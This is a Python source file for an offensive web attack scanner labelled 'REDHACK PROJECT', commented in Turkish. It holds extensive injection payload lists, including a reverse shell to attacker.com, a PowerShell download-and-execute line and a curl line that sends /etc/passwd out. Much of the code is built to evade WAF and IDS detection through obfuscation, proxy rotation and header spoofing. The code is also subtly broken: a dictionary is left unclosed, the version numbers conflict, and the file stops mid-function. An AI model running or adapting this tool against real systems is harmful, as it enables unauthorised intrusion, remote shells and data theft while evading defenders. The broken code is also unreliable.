#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ELITE WEB VULNERABILITY SCANNER v3.0 (REDHACK PROJECT)
# TAM KAPSAMLI - SIFIR HATA - ASKERI SEVIYE GUVENLIK

import os
import sys
import re
import json
import socket
import requests
import argparse
import threading
import ipaddress
import urllib.parse
import time
import random
import xml.etree.ElementTree as ET
import nmap3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import logging
import socks
from tqdm import tqdm
from datetime import datetime
import hashlib
import base64
import zlib
import math
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import scapy.all as scapy
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from sklearn.ensemble import IsolationForest
import numpy as np

# GÜVENLİK ÖNLEMİ
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# GLOBAL TANIMLAMALAR
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

VERSION = "4.0"
BANNER = f"""
{RED}{BOLD}
▓█████▄  ▒█████   ███▄ ▄███▓ ▄▄▄       ███▄    █   ██████ 
▒██▀ ██▌▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ 
░██   █▌▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   
░▓█▄   ▌▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒
░▒████▓ ░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒
 ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒   ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░
 ░ ░  ░ ░ ░ ░ ▒  ░      ░     ░   ▒      ░   ░ ░ ░  ░  ░  
   ░        ░ ░         ░         ░  ░         ░       ░  
 ░                                                        
{RESET}
{BLUE}>>> ELITE WEB VULNERABILITY SCANNER v{VERSION} (REDHACK PROJECT) <<<
{BLUE}>>> TAM KAPSAMLI - SIFIR HATA - ASKERI SEVIYE OTOMASYON <<<
{RESET}
"""

# Logging konfigürasyonu
logging.basicConfig(
    filename=f"redhack_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('EliteScanner')

class EliteScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
                'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'X-Forwarded-For': socket.inet_ntoa(bytes(random.randint(0, 255) for _ in range(4)))
        self.vulnerabilities = []
        self.discovered_paths = set()
        self.secure_links = set()
        self.sensitive_files = [
            '.env', '.git/config', '.htpasswd', 'robots.txt', 
            'web.config', 'phpinfo.php', 'admin.php', 'backup.zip',
            'config.php', 'credentials.txt', 'secret.txt',
            'wp-config.php', 'docker-compose.yml', 'traefik.yml',
            'settings.py', 'secrets.json', 'id_rsa', 'id_dsa',
            'access.log', 'error.log', 'database.yml', 'config.inc.php'
        ]
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>', 
                '<img src=x onerror=alert(1)>', 
                'javascript:alert(1)',
                '"><svg/onload=alert(1)>',
                '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
                '\'"><img src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '{{constructor.constructor(\'alert(1)\')()}}',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                # Mutation XSS payloads
                '<x oncut=alert(1)>x</x>',
                '<details ontoggle=alert(1)>',
                '<input autofocus onfocus=alert(1)>',
                # SVG payloads
                '<svg><script>alert(1)</script></svg>',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
            ],
            'sqli': [
                "' OR '1'='1'--", 
                "' OR SLEEP(5)--", 
                "1; DROP TABLE users--",
                "1' UNION SELECT NULL,@@version--",
                "1 AND EXTRACTVALUE(2470,CONCAT(0x5c,0x7178787171,(SELECT MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.PROCESSLIST LIMIT 1),0x717a6b7171))--",
                # DBMS-specific payloads
                "1; SELECT pg_sleep(5)--",  # PostgreSQL
                "1'; WAITFOR DELAY '0:0:5'--",  # MSSQL
                "' OR 1=1 IN BOOLEAN MODE--",  # MySQL
                "1' UNION ALL SELECT NULL,NULL,NULL FROM DUAL--",  # Oracle
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                # WAF bypass payloads
                "%0A'%0AOR%0A'1'='1",
                "'UNION/**/SELECT/**/user(),2,3,4--",
                "'/*!50000OR*/'1'='1'--",
                # OOB techniques
                "1'; DECLARE @q VARCHAR(100); SET @q='\\\\attacker.com\\share'; EXEC master..xp_dirtree @q;--",
                "1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(user())),'.attacker.com\\test.txt'))--",
                # Polyglot payloads
                "SLEEP(5) /*' OR SLEEP(5) OR '\" OR SLEEP(5) OR \"*/"
            ],
            'lfi': [
                '../../../../etc/passwd', 
                '....//....//etc/passwd', 
                '%2e%2e%2fetc%2fpasswd',
                '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
                '/proc/self/environ',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '../../../../boot.ini',
                '%00../../../../etc/passwd',
                '....\/....\/etc/passwd',
                # Windows specific
                '..\\..\\..\\..\\windows\\win.ini',
                '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
                # Null byte bypass
                '/etc/passwd%00',
                # Path truncation
                '/etc/passwd' + ('A' * 4096),
                # RFI payloads
                'http://evil.com/shell.txt',
                '\\\\evil.com\\share\\shell.txt',
                'data:text/plain,<?php system("id"); ?>',
                'expect://id',
                # WAF bypass
                '....//....//etc//passwd',
                '..///..///..///etc/passwd',
                '/%5c../%5c../%5c../etc/passwd'
            ],
            'rce': [
                ';id', 
                '|id', 
                '`id`', 
                '$(id)',
                '||id',
                '&&id',
                ';cat /etc/passwd',
                '|cat /etc/passwd',
                # Windows specific
                ';whoami',
                '|whoami',
                '`whoami`',
                '$(whoami)',
                # Complex commands
                ';python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
                ';powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')"',
                # WAF bypass
                '{${system(\'id\')}}',
                '{{system(\'id\')}}',
                # Encoded commands
                ';echo%20Y2QgL2QgIkM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaQ%3D%3D|base64%20-d|sh',
                # Blind RCE
                ';curl -d @/etc/passwd http://attacker.com/leak',
                # Polyglot
                '`$(echo id)`'
            ],
            'ssti': [
                '{{7*7}}', 
                '<%= 7*7 %>', 
                '${7*7}',
                '#{7*7}',
                '*{7*7}',
                # Advanced payloads
                '{{config}}',  # Flask
                '<% out.println(7*7); %>',  # Java
                '{{settings.SECRET_KEY}}',
                '{{''.__class__.__mro__[1].__subclasses__()}}',
                '${T(java.lang.System).getenv()}',
                '#set($e="exp")${$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}',
                # Sandbox escape
                '{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}'
            ],
            'idor': [
                '../admin/users/1',
                '../../api/user/2',
                '/api/v1/user/3',
                # Different ID types
                '/user/123e4567-e89b-12d3-a456-426614174000',  # UUID
                '/profile/0x7b',  # Hex
                '/account/00000001',  # Padded
                '/document/1%27',  # Encoded
                '/api/user/1?access_token=123',  # Token manipulation
                # Advanced IDOR
                '/api/v2/user/1?admin=true',
                '/download?file=../../etc/passwd',
                '/export?format=pdf&id=1'
            ],
            'ssrf': [
                'http://169.254.169.254/latest/meta-data/',
                'file:///etc/passwd',
                'gopher://127.0.0.1:80/_GET%20/HTTP/1.1',
                'dict://127.0.0.1:6379/info',
                # Advanced payloads
                'ldap://127.0.0.1:389/%0astats%0aquit',
                'ftp://attacker.com:21/test.txt',
                'sftp://attacker.com:22/test.txt',
                # Blind SSRF
                'http://attacker.com/ssrf?token=secret',
                # AWS metadata bypass
                'http://[::1]/latest/meta-data/',
                'http://2130706433/latest/meta-data/',  # 127.0.0.1 in decimal
                'http://0x7f000001/latest/meta-data/',  # Hex IP
                # Internal network scan
                'http://10.0.0.1:80/',
                'http://192.168.1.1:8080/',
                'http://172.16.0.1:22/',
                # Protocol smuggling
                'https://attacker.com@169.254.169.254'
            ],
            'xxe': [
                '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>',
                '<!DOCTYPE test [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe"> %remote; ]>',
                # Advanced payloads
                '<!DOCTYPE data [ <!ENTITY % start "<![CDATA["> <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % end "]]>"> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>',
                # Blind XXE
                '<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe"> %remote; %int; %send; ]>',
                # SVG-based XXE
                '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>',
                # Out-of-band XXE
                '<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">'
            ],
            'open_redirect': [
                'https://google.com',
                'http://evil.com',
                '//attacker.com',
                # Advanced payloads
                'attacker.com',
                '\\attacker.com',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'http://localhost:80@attacker.com',
                'http://%61%74%74%61%63%6b%65%72%2e%63%6f%6d',
                # Meta refresh bypass
                '/redirect?url=/%2F%2Fattacker.com',
                # CRLF injection
                '/redirect?url=http://attacker.com%0d%0aSet-Cookie:PHPSESSID=malicious',
                # IP obfuscation
                'http://0x00000000000000000000000000000001'
            ],
            'csrf': [
                '<form action="http://evil.com" method="POST"><input type="submit" value="Click!"></form>',
                # Advanced payloads
                '<script>document.forms[0].action="http://evil.com";document.forms[0].submit();</script>',
                '<img src="http://bank.com/transfer?amount=1000&to=attacker" width="0" height="0">',
                '<link rel="stylesheet" href="http://evil.com/steal.php?cookies=document.cookie">',
                # JSON CSRF
                '<script>fetch("http://bank.com/transfer", {method: "POST", body: JSON.stringify({amount:1000,to:"attacker"})});</script>'
            ],
            'directory_listing': [
                '/',
                '/backup/',
                '/archive/',
                '/logs/',
                '/tmp/',
                '/old/',
                '/dev/',
                '/test/',
                '/config/',
                '/admin/',
                '/includes/',
                '/src/',
                '/source/',
                '/dump/',
                '/sql/',
                '/database/'
            ]
        }
        self.ports = [21, 22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 11211, 9200]
        self.nmap_scanner = nmap3.Nmap()
        self.lock = threading.Lock()
        self.scan_state = {
            'discovered_paths': set(),
            'vulnerabilities': []
        }
        self.proxy_list = []
        self.current_proxy = None
        self.proxy_rotation_index = 0
        self.scan_start_time = time.time()
        self.total_requests = 0
        self.scan_progress = {
            'crawled': 0,
            'vulnerabilities': 0,
            'sensitive_files': 0,
            'ports_scanned': 0
        }
        # Machine Learning State
        self.payload_efficacy = {}
        self.anomaly_detector = IsolationForest(contamination=0.1)
        self.response_features = []
        # Headless browser for DOM-based XSS
        self.init_headless_browser()
        self.load_state()

    def init_headless_browser(self):
        """Headless tarayıcı başlatma"""
        try:
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-extensions')
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            caps = DesiredCapabilities.CHROME
            caps['goog:loggingPrefs'] = {'browser': 'ALL'}
            self.driver = webdriver.Chrome(options=options, desired_capabilities=caps)
        except Exception as e:
            logger.error(f"Headless browser init error: {str(e)}", exc_info=True)
            print(f"{RED}[!] Headless tarayıcı başlatılamadı: {e}{RESET}")
            self.driver = None

    def encrypt_payload(self, payload):
        """Payload şifreleme (AES-256-CBC)"""
        key = os.urandom(32)
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded_payload = payload + (16 - len(payload) % 16) * chr(16 - len(payload) % 16)
        ciphertext = encryptor.update(padded_payload.encode()) + encryptor.finalize()
        return base64.b64encode(iv + ciphertext).decode()

    def polymorphic_obfuscate(self, payload):
        """Polimorfik obfuscasyon"""
        techniques = [
            lambda s: ''.join([f'%{ord(c):02x}' for c in s]),  # URL encode
            lambda s: base64.b64encode(s.encode()).decode(),    # Base64
            lambda s: s.encode('utf-16le').decode('latin1'),   # UTF-16 encoding
            lambda s: ''.join([f'\\u{ord(c):04x}' for c in s]), # Unicode escape
            lambda s: ''.join([f'\\x{ord(c):02x}' for c in s]), # Hex escape
            lambda s: s[::-1],                                  # Reverse string
            lambda s: ''.join(random.choices(['', ' ', '\t', '\n'], k=random.randint(1,3)) + c for c in s),  # Whitespace injection
            lambda s: self.encrypt_payload(s)                  # AES encryption
        ]
        return random.choice(techniques)(payload)

    def load_state(self):
        """Tarama durumunu yükle"""
        state_file = f"redhack_state_{self.target.replace('://', '_').replace('/', '_')}.json"
        if os.path.exists(state_file):
            try:
                with open(state_file, 'r') as f:
                    self.scan_state = json.load(f)
                    self.discovered_paths = set(self.scan_state['discovered_paths'])
                    self.vulnerabilities = self.scan_state['vulnerabilities']
                    self.payload_efficacy = self.scan_state.get('payload_efficacy', {})
                print(f"{GREEN}[*] Önceki tarama durumu yüklendi{RESET}")
            except Exception as e:
                logger.error(f"State load error: {str(e)}", exc_info=True)
                print(f"{RED}[!] Durum yükleme hatası: {e}{RESET}")

    def save_state(self):
        """Tarama durumunu kaydet"""
        state_file = f"redhack_state_{self.target.replace('://', '_').replace('/', '_')}.json"
        self.scan_state = {
            'discovered_paths': list(self.discovered_paths),
            'vulnerabilities': self.vulnerabilities,
            'payload_efficacy': self.payload_efficacy
        }
        try:
            with open(state_file, 'w') as f:
                json.dump(self.scan_state, f)
        except Exception as e:
            logger.error(f"State save error: {str(e)}", exc_info=True)
            print(f"{RED}[!] Durum kaydetme hatası: {e}{RESET}")

    def validate_target(self):
        """Hedef URL'nin geçerliliğini kontrol et"""
        if not re.match(r'^https?://', self.target):
            self.target = 'http://' + self.target
        try:
            response = self.session.head(self.target, timeout=10, verify=False, allow_redirects=True)
            response.raise_for_status()
            return True
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            # Geçici hata - yeniden deneme
            for _ in range(3):
                try:
                    time.sleep(2 ** _)  # Exponential backoff
                    response = self.session.head(self.target, timeout=10, verify=False, allow_redirects=True)
                    response.raise_for_status()
                    return True
                except:
                    pass
            logger.error(f"Target connection error: {str(e)}", exc_info=True)
            print(f"{RED}[!] Hedef erişilemez: {e}{RESET}")
            return False
        except requests.exceptions.RequestException as e:
            logger.error(f"Target validation error: {str(e)}", exc_info=True)
            print(f"{RED}[!] Hedef doğrulama hatası: {e}{RESET}")
            return False

    def adaptive_delay(self):
        """WAF/IDS atlatma için adaptif gecikme"""
        # Hata oranına göre dinamik gecikme
        error_rate = len(self.response_features) / (self.total_requests + 1)
        base_delay = max(0.5, min(3.0, error_rate * 10))
        jitter = random.uniform(-0.5, 0.5)
        delay = max(0.1, base_delay + jitter)
        time.sleep(delay)

    def rotate_proxy(self):
        """Proxy rotasyonu"""
        if not self.proxy_list:
            return
            
        self.proxy_rotation_index = (self.proxy_rotation_index + 1) % len(self.proxy_list)
        self.current_proxy = self.proxy_list[self.proxy_rotation_index]
        
        if self.current_proxy.startswith('socks5://'):
            proxy_ip = self.current_proxy.split('://')[1].split(':')[0]
            proxy_port = int(self.current_proxy.split(':')[2])
            self.session.proxies = {
                'http': f'socks5://{proxy_ip}:{proxy_port}',
                'https': f'socks5://{proxy_ip}:{proxy_port}'
            }
        else:
            self.session.proxies = {
                'http': self.current_proxy,
                'https': self.current_proxy
            }
            
        print(f"{CYAN}[*] Proxy rotasyonu: {self.current_proxy}{RESET}")

    def apply_waf_evasion(self, url):
        """Gelişmiş WAF atlatma teknikleri"""
        # HTTP Request Smuggling
        headers = self.session.headers.copy()
        if random.random() > 0.7:
            headers['Transfer-Encoding'] = 'chunked'
            headers['Content-Length'] = str(random.randint(100, 1000))
        
        # HTTP Parameter Pollution
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        polluted_query = {}
        for key, values in query.items():
            polluted_query[key] = values
            if random.random() > 0.5:
                polluted_key = key + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
                polluted_query[polluted_key] = [self.polymorphic_obfuscate(random.choice(self.payloads['xss']))]
        
        # Encoding variations
        encoding_types = ['double', 'utf8', 'hex', 'unicode', 'base64', 'aes']
        encoded_url = url
        for _ in range(random.randint(0, 3)):
            encoding_type = random.choice(encoding_types)
            if encoding_type == 'double':
                encoded_url = urllib.parse.quote(urllib.parse.quote(encoded_url))
            elif encoding_type == 'utf8':
                encoded_url = ''.join([f'%{ord(c):02x}' for c in encoded_url])
            elif encoding_type == 'hex':
                encoded_url = ''.join([f'\\x{ord(c):02x}' for c in encoded_url])
            elif encoding_type == 'unicode':
                encoded_url = ''.join([f'%u{ord(c):04x}' for c in encoded_url])
            elif encoding_type == 'base64':
                encoded_url = base64.b64encode(encoded_url.encode()).decode()
            elif encoding_type == 'aes':
                encoded_url = self.encrypt_payload(encoded_url)
        
        # Null byte injection
        if random.random() > 0.7:
            encoded_url += '%00'
            
        # Case randomization
        if random.random() > 0.6:
            encoded_url = ''.join(random.choice([c.upper(), c.lower()]) for c in encoded_url)
            
        # Whitespace injection
        if random.random() > 0.5:
            positions = random.sample(range(len(encoded_url)), min(3, len(encoded_url)//3))
            for pos in sorted(positions, reverse=True):
                whitespace = random.choice(['', ' ', '\t', '\n', '\r'])
                encoded_url = encoded_url[:pos] + whitespace + encoded_url[pos:]
        
        return encoded_url, headers, polluted_query

    def send_request(self, method, url, **kwargs):
        """WAF atlatma teknikleriyle güvenli istek gönderimi"""
        self.total_requests += 1
        if self.total_requests % 10 == 0 and self.proxy_list:
            self.rotate_proxy()
            
        evasion_url, evasion_headers, polluted_query = self.apply_waf_evasion(url)
        
        try:
            # Parametre kirliliği uygula
            if polluted_query:
                kwargs['params'] = polluted_query
                
            # Adaptif gecikme
            self.adaptive_delay()
            
            # İstek gönder
            response = self.session.request(
                method,
                evasion_url,
                headers={**self.session.headers, **evasion_headers},
                timeout=15,
                verify=False,
                **kwargs
            )
            
            # Response analizi için özellik çıkarımı
            response_time = response.elapsed.total_seconds()
            status_code = response.status_code
            content_length = len(response.content)
            header_count = len(response.headers)
            self.response_features.append([response_time, status_code, content_length, header_count])
            
            # Anomali tespiti
            if len(self.response_features) > 10:
                preds = self.anomaly_detector.fit_predict(np.array(self.response_features[-10:]))
                if -1 in preds:
                    print(f"{YELLOW}[~] Anomali tespit edildi: WAF/IDS aktivitesi{RESET}")
                    self.adaptive_delay()
            
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            # Geçici hata - yeniden deneme
            for i in range(3):
                try:
                    time.sleep(2 ** i)  # Exponential backoff
                    response = self.session.request(
                        method,
                        evasion_url,
                        headers={**self.session.headers, **evasion_headers},
                        timeout=15,
                        verify=False,
                        **kwargs
                    )
                    return response
                except:
                    pass
            logger.error(f"Request connection error: {str(e)}", exc_info=True)
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"Request error: {str(e)}", exc_info=True)
            return None

    def crawler(self, url):
        """Derinlemesine web sitesi tarama"""
        try:
            if url in self.discovered_paths:
                return
                
            self.discovered_paths.add(url)
            self.scan_progress['crawled'] += 1
            
            response = self.send_request('GET', url)
            if not response:
                return
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Formları analiz et
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    input_details = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_details['inputs'].append(input_details)
                
                self.vulnerability_checks(url, form_details)
            
            # Bağlantıları takip et
            links = soup.find_all('a', href=True)
            for link in tqdm(links, desc="Taranıyor", leave=False):
                href = link['href']
                if href.startswith('javascript:') or href.startswith('mailto:'):
                    continue
                    
                full_url = urllib.parse.urljoin(url, href)
                
                # Döngüsel yönlendirmeleri önle
                if full_url == url or full_url in self.discovered_paths:
                    continue
                    
                # Güvenli linkleri kontrol et
                if self.target in full_url:
                    if full_url not in self.secure_links:
                        self.secure_links.add(full_url)
                        threading.Thread(target=self.crawler, args=(full_url,)).start()
        
        except (urllib.parse.URLError, ValueError) as e:
            logger.error(f"URL parsing error: {str(e)}", exc_info=True)
        except Exception as e:
            logger.error(f"Crawler error: {str(e)}", exc_info=True)
            print(f"{YELLOW}[~] Tarama hatası: {e}{RESET}")

    def vulnerability_checks(self, url, form_details=None):
        """Tüm açık testlerini gerçekleştir"""
        self.test_xss(url, form_details)
        self.test_sqli(url, form_details)
        self.test_lfi(url)
        self.test_rce(url, form_details)
        self.test_ssti(url, form_details)
        self.test_idor(url)
        self.test_ssrf(url)
        self.test_xxe(url)
        self.test_open_redirect(url)
        self.test_csrf(url, form_details)
        self.test_sensitive_files()
        self.test_headers()
        self.test_directory_listing()
        self.test_port_scan()
        self.test_auth_bypass()
        self.test_brute_force()
        self.test_session_fixation()
        self.test_access_control()

    def test_dom_xss(self, url, payload):
        """DOM-based XSS için headless tarayıcı testi"""
        if not self.driver:
            return False
            
        try:
            self.driver.get(url)
            time.sleep(2)  # Sayfanın yüklenmesini bekle
            
            # Payload'ı URL parametresi olarak ekle
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            query['test'] = [payload]
            new_query = urllib.parse.urlencode(query, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            self.driver.get(test_url)
            time.sleep(3)
            
            # Console log'larını kontrol et
            logs = self.driver.get_log('browser')
            for log in logs:
                if 'alert' in log['message'] or 'XSS' in log['message']:
                    return True
                    
            # Sayfa kaynağını kontrol et
            if payload in self.driver.page_source:
                return True
                
        except Exception as e:
            logger.error(f"DOM XSS test error: {str(e)}", exc_info=True)
            
        return False

    def test_stored_xss(self, url, form_details):
        """Stored XSS testi"""
        if not form_details:
            return
            
        payload = '<script>alert("XSS")</script>'
        try:
            data = {}
            for input_field in form_details['inputs']:
                if input_field['type'] == 'hidden':
                    data[input_field['name']] = input_field['value']
                else:
                    data[input_field['name']] = payload
            
            action_url = urllib.parse.urljoin(url, form_details['action'])
            
            if form_details['method'] == 'GET':
                response = self.send_request('GET', action_url, params=data)
            else:
                response = self.send_request('POST', action_url, data=data)
                
            if not response:
                return
                
            # Payload'ın sunucuda depolanıp depolanmadığını kontrol et
            stored_check = self.send_request('GET', action_url)
            if stored_check and payload in stored_check.text:
                self.report_vulnerability('Stored XSS', action_url, payload)
                
        except Exception as e:
            logger.error(f"Stored XSS test error: {str(e)}", exc_info=True)

    def test_xss(self, url, form_details):
        """Gelişmiş XSS açığı testi"""
        for payload in self.payloads['xss']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                
                if form_details:
                    data = {}
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'hidden':
                            data[input_field['name']] = input_field['value']
                        else:
                            data[input_field['name']] = obfuscated_payload
                    
                    action_url = urllib.parse.urljoin(url, form_details['action'])
                    
                    if form_details['method'] == 'GET':
                        response = self.send_request('GET', action_url, params=data)
                    else:
                        response = self.send_request('POST', action_url, data=data)
                else:
                    test_url = f"{url}?q={urllib.parse.quote(obfuscated_payload)}"
                    response = self.send_request('GET', test_url)
                
                if not response:
                    continue
                    
                if payload in response.text or obfuscated_payload in response.text:
                    self.report_vulnerability('XSS', url, payload)
                    
                # DOM-based XSS kontrolü
                if self.test_dom_xss(url if not form_details else action_url, payload):
                    self.report_vulnerability('DOM-based XSS', url, payload)
                        
                # CSP bypass kontrolü
                if 'Content-Security-Policy' in response.headers:
                    csp = response.headers['Content-Security-Policy']
                    if 'unsafe-inline' in csp or 'unsafe-eval' in csp:
                        self.report_vulnerability('CSP Misconfiguration', url, csp)
                        
                # Stored XSS testi
                if form_details and form_details['method'] == 'POST':
                    self.test_stored_xss(url, form_details)
                        
            except Exception as e:
                logger.error(f"XSS test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] XSS test hatası: {e}{RESET}")

    def test_sqli(self, url, form_details):
        """Gelişmiş SQL Injection testi"""
        for payload in self.payloads['sqli']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                
                if form_details:
                    data = {}
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'hidden':
                            data[input_field['name']] = input_field['value']
                        else:
                            data[input_field['name']] = obfuscated_payload
                    
                    action_url = urllib.parse.urljoin(url, form_details['action'])
                    
                    start_time = time.time()
                    if form_details['method'] == 'GET':
                        response = self.send_request('GET', action_url, params=data)
                    else:
                        response = self.send_request('POST', action_url, data=data)
                    elapsed_time = time.time() - start_time
                else:
                    test_url = f"{url}?id={urllib.parse.quote(obfuscated_payload)}"
                    start_time = time.time()
                    response = self.send_request('GET', test_url)
                    elapsed_time = time.time() - start_time
                
                if not response:
                    continue
                    
                # Hata tabanlı SQLi
                error_patterns = [
                    r"SQL syntax", r"MySQL server", r"ORA-[0-9]{4}",
                    r"unclosed quotation", r"syntax error", r"SQLiteException",
                    r"PostgreSQL.*ERROR", r"Warning.*mysqli", r"Unclosed quotation mark",
                    r"Microsoft OLE DB Provider", r"ODBC Driver", r"JDBC Driver",
                    r"SQL Server.*Driver", r"PostgreSQL.*error", r"SQLSTATE"
                ]
                
                if any(re.search(pattern, response.text, re.I) for pattern in error_patterns):
                    self.report_vulnerability('SQL Injection', url, payload)
                
                # Zaman tabanlı SQLi
                if elapsed_time > 5:
                    self.report_vulnerability('SQL Injection (Time-Based)', url, payload)
                
                # Boolean-based SQLi
                true_response = self.send_request('GET', f"{url}?id=1")
                false_response = self.send_request('GET', f"{url}?id=1'")
                
                if true_response and false_response:
                    if true_response.status_code == 200 and false_response.status_code != 200:
                        self.report_vulnerability('SQL Injection (Boolean-Based)', url, payload)
                    
            except requests.exceptions.Timeout:
                self.report_vulnerability('SQL Injection (Time-Based)', url, payload)
            except Exception as e:
                logger.error(f"SQLi test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] SQLi test hatası: {e}{RESET}")

    def test_lfi(self, url):
        """LFI/RFI açığı testi"""
        for payload in self.payloads['lfi']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                test_url = f"{url}?file={obfuscated_payload}" if '?' in url else f"{url}?page={obfuscated_payload}"
                response = self.send_request('GET', test_url)
                
                if not response:
                    continue
                    
                # Başarılı LFI belirtileri
                if any(pattern in response.text for pattern in ["root:", "daemon:", "Administrator:", "boot loader", "[boot loader]", "kernel=", "SYSTEMROOT"]):
                    self.report_vulnerability('Local File Inclusion', test_url, payload)
                
                # RFI testi
                if payload.startswith('http://') or payload.startswith('https://'):
                    if "RFI_TEST_SUCCESS" in response.text:
                        self.report_vulnerability('Remote File Inclusion', test_url, payload)
                    
            except Exception as e:
                logger.error(f"LFI test error: {str(e)}", exc_info=True)
                print(f"{YELLOW}[~] LFI test hatası: {e}{RESET}")

    def test_rce(self, url, form_details):
        """Komut Enjeksiyon testi"""
        for payload in self.payloads['rce']:
            try:
                obfuscated_payload = self.polymorphic_obfuscate(payload)
                
                if form_details:
                    data = {}
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'hidden':
                            data[input_field['name']] = input_field['value']
                        else:
                            data[input_field['name']] = obfuscated_payload
                    
                    action_url = urllib.parse.urljoin(url, form_details['action'])
                    
                    if form_details['method'] == 'GET':
                        response = self.send_request('GET', action_url, params=data)
                    else:
